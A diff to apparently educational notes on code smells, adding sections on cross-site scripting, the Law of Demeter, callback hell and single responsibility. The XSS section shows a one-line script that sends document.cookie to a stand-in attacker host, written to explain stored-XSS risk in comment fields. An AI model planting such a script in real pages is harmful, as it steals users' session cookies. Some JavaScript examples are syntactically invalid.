@@ -284,6 +284,34 @@ for(var i = 0, i < myArray.length; i++) {
 
 You can see the correct way of array iteration being used [here](https://github.com/mcschatz/breakout/blob/cd05e17be5bf83b2b79554f880f8d98038dca41d/lib/game.js#L49)
 
+
+#### Cross-Site Scripting (XSS) Attack Vulnerability
+Cross-site Scripting is when malicious scripts are inserted into the client-side code of a web site or application. You are vulnerable to this kind of attack when you use unvalidated or unencoded user input directly in your site.
+
+Let's say an attacker wants to steal your users cookies (I can't believe that's a real sentence in web development, but anyway... let's assume)
+
+You could do something like that with this line of code:
+
+```
+<script>
+  window.location='http://mysweethackingwebsite98736902/?cookie='+document.cookie
+</script>
+```
+
+Now let's say that in your Blogger app, you take the contents of what someone types in a comment field - store it in the database - and then show it on a page.
+
+Boom. Hacked.
+
+Another example is - maybe you have a store online. Maybe you're selling very expensive t-shirts. Maybe you pull in information like price from the database.
+
+Maybe you then run a sale that takes 10% off of the price and you do your calculation in JavaScript and then change the price on the page.
+
+Maybe then, since you did the calculation in JavaScript, you rely on pulling in the t-shirt's price from the DOM when someone purchases it.
+
+What could go wrong?
+
+![yeezy](http://g.recordit.co/l1xVMiCft7.gif)
+
 __Discussion Points__
 * Did any of the above examples surprise you?
 * How often do you think developers make these kinds of 'mistakes' in production code?
@@ -291,13 +319,145 @@ __Discussion Points__
 
 ## Additional Code Smells
 
-#### Cross-Site Scripting Vulnerability
-
 #### Breaking the Law of Demeter
+
+No, not [this Demeter](https://en.wikipedia.org/wiki/Demeter). (Though she is the center of one of the more interesting season myths). 
+
+The Law of Demeter (LoD) is also known as the **principle of least knowledge**, which is a fancy way of saying each piece of code should be stupid. Here are some critical points: 
+
+* Units of code should have limited knowledge of other code. 
+* Stranger Danger: Code should only talk to code it knows.
+
+LoD is a critical philosophy of object-oriented programming (OOP) and requires objects to request something from another object or instance rather than accessing it directly. 
+
+Object methods can invoke the methods of 5 types of objects: 
+
+1. The object itself. 
+2. The method's paramethers. 
+3. Objects instantiated within the method. 
+4. The Object's direct components. 
+5. Global variables within scope.
+
+**Example of LoD Code Smell**
+```
+class Invoice < ActiveRecord::Base
+  belongs_to :user
+end
+
+<%= @invoice.user.name %>
+<%= @invoice.user.address %>
+<%= @invoice.user.cellphone %>
+```
+
+**Example of Refactored Code**
+```
+class Invoice < ActiveRecord::Base
+  belongs_to :user
+  delegate :name, :address, :cellphone, :to => :user, :prefix => true
+end
+
+<%= @invoice.user_name %>
+<%= @invoice.user_address %>
+<%= @invoice.user_cellphone %>
+```
 
 #### Callback Hell
 
+Async Javascript requires the use of Callbacks. Imagine a series of events A, B and C. If C relies on B and B relies on A, this can get
+problematic. Imagine the following async snippet with conditionals:
+
+
+```
+doAsync1(function () {
+  doAsync2(function () {
+    doAsync3(function () {
+      doAsync4(function () {
+    })
+  })
+})
+
+```
+
+Ways to avoid and re-factor Callback Hell:
+* `Modular approach` includes breaking each task into seperate functions. Instead of sprinkling anonymous functions everywhere, you can
+  have specific functions that are re-useable. Imagine the follow:
+
+```
+function onProcess3(err, data) {
+  if (err) return res.status(500).send(err)
+  fs.writeFile(outputFile, data, onWriteFile)
+}
+```
+
+* `Promises approach` includes using methods such as `.then`, `.catch` and other error
+  handling approachs.
+* `ES6 generators` includes a "Pause and Execute" approach. It is definetely worth reading the blog [here](https://medium.com/@adamkijensen/til-es6-generators-39196f7f5283#.3xf1s11bu)
+* Use an external library such as [highland.js](http://highlandjs.org/) or [async](https://github.com/caolan/async)
+
 #### Single Responsibility Principle && Code that Does Too Much
+
+A class or module should only have one reason to change.
+
+Anything that gives a class a reason to change should be considered a responsibility.
+
+````
+* Persistence
+* Validation
+* Notification
+* Error Handling
+* Class Selection / Instantiation
+* Formatting
+* Parsing
+* Mapping
+````
+
+Code that does too much, where logic isn’t contained, can cause unintended side effects.
+
+It's better to separate responsibilities so the codebase is robust to change and easy to understand, in a sense future-proof.
+
+Example:
+
+````js
+function IncomeStatement() {
+	let transactions = transactions
+}
+
+IncomeStatement.prototype.process_transactions() {
+  for transaction in transactions {
+    this.calc_revenue(transaction)
+  }
+}
+
+IncomeStatement.prototype.calc_revenue(transaction) {
+	transaction.sale_price - transaction.cost_of_goods;
+}
+````
+
+If we change how revenue is calculated for certain transactions, by including other fixed or variable costs, the income statement class will have to change.
+
+Refactored:
+
+````js
+function IncomeStatement() {
+	let transactions = transactions
+}
+
+IncomeStatement.prototype.process_transactions() {
+  for transaction in transactions {
+    Revenue.calc_revenue(transaction)
+  }
+};
+
+function Revenue() {
+  let gross_profit = gross_profit
+}
+
+Revenue.prototype.calc_revenue(transaction) {
+	gross_profit = transaction.sale_price - transaction.cost_of_goods
+}
+````
+
+Now the calculation of revenue is independent of the larger income statement and can adapt to transaction specific costs.
 
 #### Passing Many Arguments to a Function
 
@@ -307,7 +467,7 @@ __Discussion Points__
 
 Deeply nested if/else statements should be avoided-- they make a program difficult to follow. There are many ways to refactor/restructure to avoid this condition, and good strategy can vary with the situation.
 
-##### 1. Break up into functions.
+#### Breaking Up Functions
 
 Instead of:
 
